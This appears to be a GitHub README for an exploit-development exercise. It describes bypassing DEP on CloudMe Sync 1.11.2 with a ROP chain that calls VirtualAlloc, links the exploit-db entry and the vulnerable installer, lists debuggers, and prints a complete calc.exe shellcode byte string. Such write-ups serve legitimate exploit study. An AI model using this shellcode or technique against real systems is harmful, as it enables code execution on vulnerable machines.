# ROPme
Bypass Data Execution Prevention (DEP) Using VirtualAlloc in a ROP (Return-Oriented Programming) chains is a common technique to bypass DEP (Data Execution Prevention) by allocating executable memory in a process. The idea is to use a sequence of gadgets (short sequences of instructions ending in a return) to call VirtualAlloc or a similar function and allocate memory with PAGE_EXECUTE_READWRITE permissions. This allocated memory can then be used to execute shellcode

![image](https://github.com/user-attachments/assets/ba318158-d6c6-462b-94a8-83b803af2827)



## i start from [here](https://www.exploit-db.com/exploits/46250)
## [CloudMe Sync 1.11.2](https://www.exploit-db.com/apps/f0534b12cd51fefd44002862918801ab-CloudMe_1112.exe) vulnerable version
## --> i use :
### - [WINdbg](https://learn.microsoft.com/en-gb/windows-hardware/drivers/debugger)
### - [immunity Debugger](https://debugger.immunityinc.com/)
### - IDA pro 
### - SublimeText 
### - IDLE from python 
### - [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function (memoryapi.h)
### - and finaly the calculator shellcode :
```sh

# Shellcode calc.exe
shellcode = ""
shellcode += "\xdb\xde\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\xba\xef"
shellcode += "\xc3\xbd\x59\x83\xc0\x04\x31\x50\x14\x03\x50\xfb\x21"
shellcode += "\x48\xa5\xeb\x24\xb3\x56\xeb\x48\x3d\xb3\xda\x48\x59"
shellcode += "\xb7\x4c\x79\x29\x95\x60\xf2\x7f\x0e\xf3\x76\xa8\x21"
shellcode += "\xb4\x3d\x8e\x0c\x45\x6d\xf2\x0f\xc5\x6c\x27\xf0\xf4"
shellcode += "\xbe\x3a\xf1\x31\xa2\xb7\xa3\xea\xa8\x6a\x54\x9f\xe5"
shellcode += "\xb6\xdf\xd3\xe8\xbe\x3c\xa3\x0b\xee\x92\xb8\x55\x30"
shellcode += "\x14\x6d\xee\x79\x0e\x72\xcb\x30\xa5\x40\xa7\xc2\x6f"
shellcode += "\x99\x48\x68\x4e\x16\xbb\x70\x96\x90\x24\x07\xee\xe3"
shellcode += "\xd9\x10\x35\x9e\x05\x94\xae\x38\xcd\x0e\x0b\xb9\x02"
shellcode += "\xc8\xd8\xb5\xef\x9e\x87\xd9\xee\x73\xbc\xe5\x7b\x72"
shellcode += "\x13\x6c\x3f\x51\xb7\x35\x9b\xf8\xee\x93\x4a\x04\xf0"
shellcode += "\x7c\x32\xa0\x7a\x90\x27\xd9\x20\xfe\xb6\x6f\x5f\x4c"
shellcode += "\xb8\x6f\x60\xe0\xd1\x5e\xeb\x6f\xa5\x5e\x3e\xd4\x59"
shellcode += "\x15\x63\x7c\xf2\xf0\xf1\x3d\x9f\x02\x2c\x01\xa6\x80"
shellcode += "\xc5\xf9\x5d\x98\xaf\xfc\x1a\x1e\x43\x8c\x33\xcb\x63"
shellcode += "\x23\x33\xde\x07\xa2\xa7\x82\xe9\x41\x40\x20\xf6"
```

# Demo 
### [Youtube video](https://www.youtube.com/watch?v=Jmxx7TdAzgw) 
